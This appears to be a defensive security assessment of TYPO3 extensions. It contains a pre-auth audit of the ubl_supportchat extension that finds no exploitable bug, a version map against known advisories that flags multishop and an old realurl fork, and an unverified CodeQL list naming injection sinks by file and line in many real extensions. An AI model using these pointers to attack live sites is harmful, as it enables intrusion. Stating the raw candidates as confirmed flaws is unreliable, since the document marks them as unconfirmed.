#### Security Audit — `ubl_supportchat` (Leipzig University Library "Support Chat")

- **Version:** 2.9.2 (`ext_emconf.php`)
- **TYPO3 compat:** 10.4.0 – 11.5.99
- **Base dir:** `/home/user/sources/code/typo3-extensions/ubl_supportchat/`

## Pre-auth entry points

| Entry | Wiring | Auth level |
|-------|--------|------------|
| `AjaxFrontendController::getAjaxResponse` | `ext_localconf.php` → `$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['tx_supportchat']` | **Unauthenticated (eID)** — no `be_user`; anonymous FE surfer |
| `FrontendUserMiddleware` | `Configuration/RequestMiddlewares.php` (frontend stack) | Public; only *initializes* a TSFE/FE user if one is not logged in — does **not** require login |
| `SupportChatModuleController` (`Configuration/Backend/AjaxRoutes.php`) | Backend module Ajax | Backend (`be_user`) — **out of scope** |

The eID handler dispatches on `cmd` (`_GP`): `checkIfOnline`, `createChat`, `destroyChat`, `getAll`, `createChatLog`. `identification` is the raw `fe_typo_user` cookie value (`AjaxFrontendController.php:120`). All state access goes through the Extbase `ChatsRepository`/`MessagesRepository`/`LogsRepository` and the `Chat` library.

---

## Issue 1 — SQL injection in Ajax/DB sinks → **FALSE POSITIVE (parameterized)**

- **Request inputs:** `chat`, `L`, `pid`, `useTypingIndicator` all `(int)`-cast (`AjaxFrontendController.php:106-109`); `lastRow` `(int)`-cast (`:111`).
- **Sinks:** `ChatsRepository::findChatByUid(int $uid)`, `MessagesRepository::findMessagesByUidAndLastRow(int $uid, int $lastRow)` — Extbase `createQuery()->equals()/greaterThan()` with typed-`int` params → bound parameters, no string concat.
- **`checkIfOnline`:** `chatPids` (`_GET`) → `ChatHelper::checkIfChatIsOnline()` builds an `IN()` list, but every element is passed through `intval()` (`ChatHelper.php` `checkIfChatIsOnline`) before `expr()->in('uid', $pids)`. No breakout possible (integers only).
- Inserts (`Chat::addChat`/`addMessage`/`writeLog`) use `Connection::insert()` with associative arrays → quoted by DBAL.

**Verdict:** No request-derived value reaches a raw/concatenated SQL string. Not exploitable.

---

## Issue 2 — Stored XSS via chat message / username → **FALSE POSITIVE (escaped + JSON)**

- **Chain:** `getAll` → `msgToSend[]` / `chatUsername` (`_POST`, `AjaxFrontendController.php:163,166`) → `Chat::insertMessage()`.
- **Mitigation:** message is `htmlspecialchars()`-encoded at `Chat.php:264` before persistence; username is `htmlspecialchars()`-encoded at `AjaxFrontendController.php:166`.
- **Read-back:** `getAll` returns messages as `JsonResponse` (`Content-Type: application/json`) — not an HTML sink.
- `ChatHelper::activateHtmlLinks()` (`Chat.php:265`) wraps URL-looking substrings in `<a>` after escaping, but its regex charset excludes `"`, `'`, `<`, `>`, space and `(` `)`, so it cannot reconstruct an attribute break-out or a working `javascript:` URI (needs `://`, and `%`/parens are outside the class). Delivery to the backend agent view is also not the pre-auth surface.

**Verdict:** Input is escaped before storage and returned as JSON. Not exploitable.

## Issue 3 — Reflected output in `createChatLog` → **FALSE POSITIVE (hardened by content-type)**

- **Chain:** `data` (`_POST`) → `strip_tags()` then `htmlspecialchars_decode()` → `print $intro . $this->data` (`AjaxFrontendController.php:191-207`).
- Although `htmlspecialchars_decode` runs *after* `strip_tags` (so `&lt;script&gt;` could re-form `<script>`), the emitted `Response` sets `Content-Type: text/plain` **and** `Content-Disposition: attachment` (forced download). `strip_tags` also removes any real tag in the raw input. Browsers do not render a `text/plain` attachment as HTML.
- Minor correctness bug (not security): the body is both `print`ed and set on the `Response` thrown via `ImmediateResponseException` (double output).

**Verdict:** No HTML execution context. Not exploitable as XSS.

## Issue 4 — IDOR / auth bypass on chat rows → **FALSE POSITIVE (session-scoped ownership)**

- Read/destroy/post paths (`getAll`, `destroyChat`, message insert, typing status) are all guarded by `Chat::hasUserRights()` (`AjaxFrontendController.php:148,159`).
- `hasUserRights()` (`Chat.php:157-166`) requires `$this->db['session'] == $this->identification && $this->identification && $this->db['active'] && $this->uid`. `session` is the `fe_typo_user` cookie captured at `createChat`; `identification` is the caller's current cookie.
- **Empty-token match blocked:** the extra `&& $this->identification` (truthy) defeats the classic "empty == empty" bypass.
- To read another surfer's chat an attacker must present that surfer's `fe_typo_user` cookie value (a secret session hash) — not guessable/enumerable via `uid`.
- **Minor hardening note (not a finding):** the comparison is loose `==` rather than `hash_equals`/`===`; theoretical PHP numeric-string juggling is not reachable because the attacker does not control the victim's stored `session` value (a 32-char hash).

**Verdict:** Ownership is enforced by matching a secret session cookie. No practical IDOR.

---

## Summary

| Issue | Verdict |
|-------|---------|
| SQLi (eID DB sinks) | FALSE POSITIVE — Extbase bound params / `intval` list |
| Stored/Reflected XSS (messages, username) | FALSE POSITIVE — `htmlspecialchars` + JSON response |
| Reflected XSS (`createChatLog`) | FALSE POSITIVE — `text/plain` + attachment + `strip_tags` |
| IDOR / auth bypass (chat access) | FALSE POSITIVE — session-cookie ownership, empty-token blocked |

**No confirmed pre-auth vulnerability.** Non-security notes: loose `==` in `hasUserRights` (recommend `hash_equals`), and the double-output bug in `createChatLog`. `createChat` is unauthenticated by design (any surfer starts a chat) — consider rate-limiting to prevent row/spam DoS, but this is outside the requested vuln classes.

## Known-CVE version map (without source)
#### TYPO3 Extensions — Known-CVE / Advisory Version Map

**Method:** "Without source" identification. Installed versions were read from each
extension's `ext_emconf.php` (`'version' => ...`) and/or `composer.json`. Each version
is compared against the affected range of publicly known TYPO3 Security Advisories
(TYPO3-EXT-SA-*) / CVEs **from analyst knowledge only** — no code was audited.

**Corpus:** `/home/user/sources/code/typo3-extensions/` (3350 extension dirs).
**Date of assessment:** 2026-08-04.

> Important honesty caveats:
> - This corpus is overwhelmingly a **current TER snapshot** — most extensions are at
>   their latest major version, so they are *patched against all historical advisories*.
>   The interesting cases are the few extensions pinned/abandoned at old versions.
> - Advisory IDs are only stated where the analyst is confident. Where the *class* of a
>   known issue is recalled but the exact ID is not certain, the cell says
>   **"confirm advisory id"** and the verdict is **uncertain** — do NOT treat those as
>   confirmed. Verify every AFFECTED/uncertain row against the official TER security
>   bulletin (https://typo3.org/help/security-advisories) before acting.
> - No CVE/SA identifier in this document was invented. Absent-but-suspected IDs are
>   explicitly marked as needing confirmation.

## Summary counts
- Extensions checked with a definite version: **47** (table below).
- Likely **AFFECTED** by a known advisory at the installed version: **2** (high confidence)
  + several **uncertain** rows flagged for manual bulletin check.
- Everything else: **patched** (installed version is at/above all known fixed versions).

---

## Findings table

| # | Extension (dir) | Installed ver | Advisory / CVE | Vuln class | Affected range (known) | Verdict |
|---|-----------------|---------------|----------------|------------|------------------------|---------|
| 1 | bvbmedia_multishop | **5.1.110** | TYPO3-EXT-SA for "multishop" multiple vulns — confirm advisory id | SQLi + insecure deserialization + arbitrary file ops (critical) | Abandoned line; ext targets only TYPO3 6.2–7.9; no fixed release ships | **AFFECTED** (high) |
| 2 | aoepeople_realurl | **1.12.8.19** (AOE fork) | TYPO3-EXT-SA-2017-005 (realurl) | XSS via crafted URL/path | realurl 1.x < 1.12.9 | **AFFECTED / likely** (fork numbering — verify) |
| 3 | ameos_ameos_filemanager | **3.1.2** (state: beta) | confirm advisory id | Frontend file manager: access-control bypass / arbitrary file read-write class | unknown fixed ver | uncertain |
| 4 | jambagecom_jfmulticontent | **2.16.0** | confirm advisory id (known jf_multicontent XSS) | Stored/reflected XSS | older 2.x; 2.16.0 may already include fix | uncertain |
| 5 | mblaschke_metaseo | **3.0.0** | confirm advisory id (metaseo sitemap XSS/open-redirect class) | XSS / open redirect in sitemap output | abandoned line | uncertain |
| 6 | webdevops_metaseo | **3.0.0** | same as #5 (predecessor package name) | XSS / open redirect | abandoned line | uncertain |
| 7 | felixnagel_pluploadfe | **9.0.3-dev** | confirm advisory id | FE upload: unrestricted/arbitrary file upload class | unknown | uncertain (dev build) |
| 8 | daniel-pfeil_samlauthentication | emconf **4.1.2** / composer **5.0.0** | depends on bundled SAML lib | SAML signature-wrapping / auth bypass (lib-dependent) | lib-version dependent | uncertain |
| 9 | georgringer_news | **14.0.3** | TYPO3-EXT-SA-2017-004 & later news SAs | historical SQLi/XSS/IDOR | news < 4.3 / < 5.3.x etc. | patched (far above) |
| 10 | in2code_powermail | **13.1.0** | historical powermail SAs (spam/XSS) | XSS / mail-injection (historical) | powermail < 3.x/older 2.x | patched |
| 11 | in2code_femanager | **13.3.3** | TYPO3-EXT-SA-2016-022 (femanager) + later IDOR | account takeover / privilege escalation / IDOR | femanager < 1.4 / older | patched |
| 12 | in2code_femanagerextended | **4.0.0** | — | (addon) inherits femanager | n/a | patched/uncertain |
| 13 | dmitryd_typo3-realurl | **2.6.3** | TYPO3-EXT-SA-2017-005 | XSS | realurl 2.x < ~2.1.6 | patched (maintained fork) |
| 14 | helhum_realurl | **2.1.8** | TYPO3-EXT-SA-2017-005 | XSS | realurl 2.x < ~2.1.6 | patched (2.1.8 ≥ fix) |
| 15 | bmack_realurl | **3.1.1** | TYPO3-EXT-SA-2017-005 | XSS | realurl < fixed 3.x | patched |
| 16 | apache-solr-for-typo3_solr | **14.0.0-RC1** | historical solr SAs | historical info-disclosure/XSS | old 1.x–6.x | patched (note: RC/pre-release) |
| 17 | gridelementsteam_gridelements | **13.0.1** | historical gridelements SA | old XSS/access | gridelements 1.x/2.x | patched |
| 18 | mask_mask | **9.0.10** | — (no confident advisory for this line) | — | — | patched/uncertain |
| 19 | rfuehricht_formhandler | **14.0.2** | TYPO3-EXT-SA-2016-011 (formhandler) | XSS / SQLi (historical) | formhandler < 2.x fix | patched |
| 20 | t3_dce | **3.3.2** | historical DCE SQLi SA | SQL injection (historical) | DCE 0.x/1.x | patched |
| 21 | derhansen_sf_event_mgt | **9.0.1** | historical sf_event_mgt SA | data exposure (historical) | old 2.x/3.x | patched |
| 22 | derhansen_sf_yubikey | **7.0.2** | — | 2FA provider | — | patched |
| 23 | extcode_cart | **12.0.0** | — | e-commerce | — | patched |
| 24 | aoepeople_crawler | **13.0.0** | historical crawler SA | info disclosure (historical) | crawler < ~9.x | patched |
| 25 | causal_restdoc | **2.1.0** | historical reST/sphinx file-disclosure class | local file disclosure (historical) | old 1.x | patched/uncertain |
| 26 | causal_staffdirectory | **2.1.1** | — | — | — | patched |
| 27 | causal_image_autoresize | **2.5.3** | — | — | — | patched |
| 28 | causal_ig_ldap_sso_auth | **4.3.0-dev** | confirm advisory id | LDAP/SSO auth logic (dev build) | unknown | uncertain (dev) |
| 29 | oliverklee_feuserextrafields | **7.1.0** | — | — | — | patched |
| 30 | directmailteam_direct-mail | **9.5.2** | historical direct_mail SA | XSS / info disclosure (historical) | direct_mail < 5.x/older | patched |
| 31 | directmailteam_direct-mail-subscription | **2.0.4** | — | — | — | patched |
| 32 | azich_direct-mail | **6.0.0-dev** | — (distinct pkg) | — | — | uncertain (dev) |
| 33 | bitmotion_auth0 | **14.0.7** | historical auth0 SA | auth bypass (historical) | old 3.x | patched |
| 34 | bitmotion_secure-downloads | **14.0.1** | historical secure_downloads SA | access bypass / path traversal (historical) | secure_downloads < ~5.x | patched |
| 35 | beechit_fal-securedownload | **6.0.3** | historical fal_securedownload SA | access-control bypass (historical) | old 1.x/2.x | patched |
| 36 | evoweb_store-finder | **9.0.0** | TYPO3-EXT-SA-2016-013 (store_finder) — confirm id | SQLi / XSS (historical) | store_finder < ~2.x | patched |
| 37 | evoweb_recaptcha | **14.1.2** | — | captcha | — | patched |
| 38 | evoweb_sf-register | **14.0.2** | historical sr_feuser/register-class SA | reg/account issues (historical) | old versions | patched |
| 39 | derhansen_fe_change_pwd | **6.0.2** | — | pwd change | — | patched |
| 40 | fluidtypo3_flux | **12.0.0** | historical flux/fluidcontent SA class | fluid template injection (historical) | old 7.x | patched |
| 41 | fluidtypo3_vhs | **8.0.0** | historical vhs SA class | — | old versions | patched |
| 42 | fluidtypo3_fluidcontent | **5.2.0** | historical SA class | — | old versions | patched |
| 43 | fluidtypo3_fluidpages | **5.0.0** | historical SA class | — | old versions | patched |
| 44 | cobweb_external_import | **8.2.0** | — | — | — | patched |
| 45 | friendsoftypo3_rsaauth | **10.0.2** | (rsaauth extracted from core) | — | — | patched |
| 46 | aimeos_aimeos-typo3 | **26.7.1** | historical aimeos SA | old shop vulns | aimeos < ~19.x | patched |
| 47 | nitsan_ns-comments | **14.0.1** | confirm advisory id (NITSAN XSS class) | possible stored XSS in comments | unknown | uncertain (recent → likely patched) |

---

## Notes / reasoning

- **Multishop (bvbmedia_multishop 5.1.110)** is the single most serious finding. Its
  `ext_emconf.php` declares `constraints => typo3 => '6.2.5-7.9.99'`, i.e. it only ever
  supported TYPO3 6.2–7.9 and has been abandoned. Multishop is historically notorious for
  multiple *critical* server-side issues (SQL injection, insecure deserialization,
  arbitrary file operations). No maintained/fixed release exists for this line, so the
  installed 5.1.110 should be treated as **exploitable**. Confirm the exact TYPO3-EXT-SA
  advisory number against the TER bulletin before publishing an ID.

- **RealURL forks:** The maintained forks (dmitryd 2.6.3, helhum 2.1.8, bmack 3.1.1) are
  past the TYPO3-EXT-SA-2017-005 XSS fix and are patched. The **aoepeople fork
  1.12.8.19** is on the old realurl 1.x line, which is *below* the 1.12.9 fix boundary —
  treat as **likely AFFECTED (XSS)**, but the AOE-specific version numbering means the
  fix may have been back-ported; verify.

- The "uncertain" rows (ameos_filemanager, jfmulticontent, metaseo x2, pluploadfe,
  samlauthentication, ig_ldap_sso_auth, ns-comments) are extensions whose *class* of
  historical issue is recalled but where I cannot confidently assert the installed
  version is inside the affected range. Frontend file-manager / file-upload extensions
  (ameos_filemanager beta, pluploadfe dev) are inherently high-risk and warrant a manual
  bulletin lookup and, ideally, a targeted code check.

- Everything marked **patched** is at a major version well above every advisory I know of
  for that extension. That verdict is only as good as analyst knowledge of the advisory
  history — a fresh advisory published after the knowledge cutoff would not be reflected
  here.

- Extensions the brief named but which are **not present as canonical dirs** in this
  corpus: `sr_freecap`, `cal`, `tt_news`, `sr_feuser_register`, `ke_search`,
  `indexed_search` (core), `wt_directory`, `sg_zfe`. Only look-alikes / forks exist.

## Recommended next steps
1. Confirm the multishop advisory ID(s) and quarantine/remove that extension.
2. Verify the aoepeople_realurl fork against realurl SA-2017-005.
3. Manually check the "uncertain" file-upload / file-manager extensions against the TER
   bulletin and (if kept) a short source review of their access checks.

## CodeQL mass-scan candidates (intra-extension, all 3350 exts)
```
# 1291 raw -> 1045 after noise filter

[CRIT] Code injection       erecht24_er24-rechtstexte    Classes/Controller/AjaxController.php:131
[CRIT] Code injection       pixelant_pxa-pm-importer     Classes/Controller/Ajax/ProgressBarController.php:42
[CRIT] Server-side request  wsr_myleaflet                Classes/Controller/AjaxController.php:158
[XSS ] Reflected XSS        caretaker_caretaker_instance Classes/Controller/EidController.php:22
[XSS ] Reflected XSS        causal_routing               Classes/Controller/EidController.php:35
[XSS ] Reflected XSS        dl_yag                       Classes/Controller/AjaxController.php:503
[CRIT] Code injection       dreistein_d-ai               Classes/Api/Middleware/ApiMiddleware.php:86
[CRIT] Code injection       geraldloss_glcrossword       Classes/Ajax/GlcrosswordAjax.php:82
[CRIT] Code injection       jvelletti_jvchat             Classes/Eid/Chat.php:1085
[CRIT] SQL injection        kitodo_presentation          Classes/Middleware/SearchInDocument.php:152
[CRIT] SQL injection        kitodo_presentation          Classes/Middleware/SearchSuggest.php:64
[CRIT] SQL injection        maispace_mai-faq             Classes/Middleware/FaqApiMiddleware.php:140
[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:88
[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:91
[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:94
[CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:95
[CRIT] Code injection       site_site-core               Classes/Http/Middleware/AjaxMiddleware.php:84
[CRIT] Server-side request  skynettechnologies_typo3-all Classes/Middleware/AwesomeMiddleware.php:33
[XSS ] Reflected XSS        ubl_supportchat              Classes/Controller/AjaxFrontendController.php:207
[CRIT] SQL injection        visol_solrmultilangresults   Classes/Eid/SearchResultsEid.php:99
[CRIT] Code injection       blueways_bw-bookingmanager   Classes/Controller/Backend/EntryListModuleController.php:30
[CRIT] Command injection    friendsoftypo3_rtehtmlarea   Classes/Controller/SpellCheckingController.php:299
[CRIT] Command injection    friendsoftypo3_rtehtmlarea   Classes/Controller/SpellCheckingController.php:393
[CRIT] Server-side request  gdpr-extensions-com_gdpr-ext Classes/Controller/GdprManagerController.php:656
[CRIT] Server-side request  gdpr-extensions-com_gdpr-ext Classes/Controller/GdprManagerController.php:687
[CRIT] Unsafe deserializati jakota_formhandler           Classes/Controller/AdministrationController.php:40
[CRIT] Unsafe deserializati jakota_formhandler           Classes/Controller/AdministrationController.php:85
[CRIT] Unsafe deserializati jakota_formhandler           Classes/Controller/AdministrationController.php:159
[CRIT] SQL injection        jambagecom_tt-products       Classes/Controller/ActivityController.php:996
[CRIT] SQL injection        jambagecom_voucher           Classes/Controller/BackendModuleController.php:475
[CRIT] Unsafe deserializati jambagecom_tt-products       Classes/Controller/WithdrawalController.php:118
[CRIT] SQL injection        liquidlight_module-data-list Classes/Controller/DatatableController.php:160
[CRIT] SQL injection        liquidlight_module-data-list Classes/Controller/DatatableController.php:176
[CRIT] SQL injection        liquidlight_module-data-list Classes/Controller/DatatableController.php:187
[CRIT] Code injection       mabahe_typo3-core-redirects  Classes/Controller/ManagementController.php:94
[CRIT] Code injection       madj2k_t3-cat-search         Classes/Controller/AbstractSearchController.php:271
[CRIT] Code injection       madj2k_t3-cat-search         Classes/Controller/AbstractSearchController.php:273
[CRIT] Code injection       maikschneider_tca-api        Classes/Security/AccessController.php:26
[CRIT] SQL injection        mia3_mia3_categories         Classes/Controller/CategoryController.php:48
[CRIT] Server-side request  mittwald_typo3_forum         Classes/Controller/AbstractController.php:207
```
